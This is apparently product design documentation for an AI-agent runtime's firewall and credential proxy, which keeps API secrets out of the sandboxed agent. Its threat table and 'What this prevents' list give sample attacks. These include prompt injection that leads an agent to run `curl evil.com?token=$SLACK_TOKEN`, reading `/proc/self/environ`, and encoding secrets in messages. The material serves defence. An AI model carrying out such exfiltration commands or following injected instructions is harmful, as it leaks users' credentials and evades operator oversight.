# UseZombie v2 — AI Firewall & Credential Isolation

**Part of:** [UseZombie v2 Overview](usezombie-v2-overview.md)

---

## AI Firewall

Every agent runtime has attack surfaces: prompt injection, credential exfiltration, tool abuse, data poisoning, privilege escalation. UseZombie applies zero-trust principles at the runtime level:

### The firewall architecture

```
Agent process (sandboxed, bubblewrap + landlock)
    │
    │  Makes a normal HTTP request:
    │  POST https://slack.com/api/chat.postMessage
    │  Body: { channel: "#support", text: "..." }
    │  (no Authorization header — agent doesn't have one)
    │
    ▼
UseZombie AI Firewall
    │
    │  1. VERIFY: is this domain in the allow list?
    │  2. POLICY: is this agent authorized for chat.postMessage?
    │  3. INSPECT: does the request body contain prompt injection patterns?
    │  4. INJECT: add Authorization header (from encrypted vault, never in sandbox)
    │  5. LOG: agent_id, endpoint, method, timestamp, response_code
    │  6. FORWARD: send authenticated request to upstream
    │  7. STRIP: remove any token echo from response
    │  8. METER: count tokens, track cost, check budget
    │
    ▼
Slack API receives authenticated request
```

### What the firewall blocks

| Attack | What happens | UseZombie response |
|--------|-------------|-------------------|
| **Prompt injection** → agent told to `curl evil.com?token=$SLACK_TOKEN` | `$SLACK_TOKEN` doesn't exist in the sandbox. `evil.com` not in allow list. | **Blocked.** Logged as intrusion attempt. |
| **Credential exfiltration** → agent reads `/proc/self/environ` | Nothing there. No env vars with secrets. | **Blocked.** No credentials in sandbox memory or filesystem. |
| **Tool abuse** → agent calls `DELETE /api/users` instead of `POST /api/chat` | Policy check: agent only authorized for `chat.postMessage`. | **Blocked.** Logged as policy violation. |
| **Data exfil via allowed domain** → agent encodes secrets in Slack message body | Content inspection catches known patterns (base64 keys, token formats). | **Flagged.** Alert to operator. |
| **Hallucination cascade** → agent spawns sub-requests in a loop | Spend ceiling hit. Wall time exceeded. | **Killed.** Budget enforced. |
| **Lateral movement** → agent tries to reach internal services | Network deny-by-default. Only declared domains reachable. | **Blocked.** |

### Firewall metrics (operator dashboard)

```
┌────────────────────────────────────────────────┐
│  AI Firewall — Last 24h                        │
│                                                │
│  Requests proxied:        1,247                │
│  Credentials injected:      891                │
│  Prompt injections blocked:   3                │
│  Policy violations caught:    7                │
│  Hallucination kills:         1                │
│  Domains blocked:            14                │
│  Budget kills:                0                │
│                                                │
│  Trust score (7-day avg):   94/100             │
│  ──────────────────────────────────────────    │
│  Top blocked domains:                          │
│    evil.com (2)  pastebin.com (1)              │
│  Top policy violations:                        │
│    DELETE /api/* (4)  PUT /admin/* (3)          │
└────────────────────────────────────────────────┘
```

These metrics are the operator's answer to "how do I know my agents are behaving?" The trust score trends over time. If it drops, something changed — new prompt injection pattern, agent instructions drifted, or a new attack vector appeared.

### Zero-trust principles applied

| Zero-trust principle | UseZombie implementation |
|---------------------|------------------------|
| **Verify then trust** | Every outbound request verified against policy before forwarding |
| **Just-in-time, not just-in-case** | Credentials injected per-request, never stored in sandbox |
| **Least privilege** | Network deny-by-default. Agent declares what it needs, nothing more |
| **Assume breach** | Sandbox assumes agent is compromised. All security is outside the sandbox boundary |
| **Pervasive controls** | Firewall + sandbox + audit log + spend ceiling — defense in depth, not perimeter only |
| **Immutable audit trail** | Every action timestamped, append-only, operator-reviewable |
| **Kill switch** | Human in the loop. Stop any agent mid-action. |

---

## How Credentials Work (The Core Technical Bet)

This is the thing that makes UseZombie different from "just run it in Docker."

Your agent never sees a credential. Ever.

```
Agent process (sandboxed, bubblewrap + landlock)
    │
    │  Makes a normal HTTP request:
    │  POST https://slack.com/api/chat.postMessage
    │  Body: { channel: "#support", text: "..." }
    │  (no Authorization header — agent doesn't have one)
    │
    ▼
UseZombie AI Firewall + Credential Proxy
    │
    │  1. Match domain: slack.com → credential exists
    │  2. Check policy: agent allowed to call chat.postMessage? ✓
    │  3. Inspect: prompt injection patterns? clean.
    │  4. Inject header: Authorization: Bearer xoxb-xxx
    │     (fetched from encrypted credential store, never written to
    │      the sandbox filesystem or env vars)
    │  5. Forward request
    │  6. Log: agent_id, endpoint, method, timestamp, response_code
    │  7. Return response to agent (stripped of any token echo)
    │  8. Meter: tokens used, cost tracked, budget checked
    │
    ▼
Slack API receives authenticated request
```

**What this prevents:**

- Agent gets prompt-injected → tries `curl evil.com?token=$SLACK_TOKEN` → `$SLACK_TOKEN` doesn't exist in the sandbox. And `evil.com` is not in the allow list. Blocked.
- Agent tries to read `/proc/self/environ` for secrets → nothing there.
- Agent tries to write credentials to a file and curl it out → no credentials in memory, and the outbound domain is blocked.
- Agent hallucinates and sends 1000 requests in a loop → spend ceiling hit, agent killed.

**How it's built:** The sandbox uses bubblewrap (user namespace isolation) + landlock (filesystem restriction). Outbound traffic routes through a proxy that handles credential injection, policy enforcement, and content inspection. The proxy runs outside the sandbox boundary. The agent process cannot access the proxy's memory or credential store.
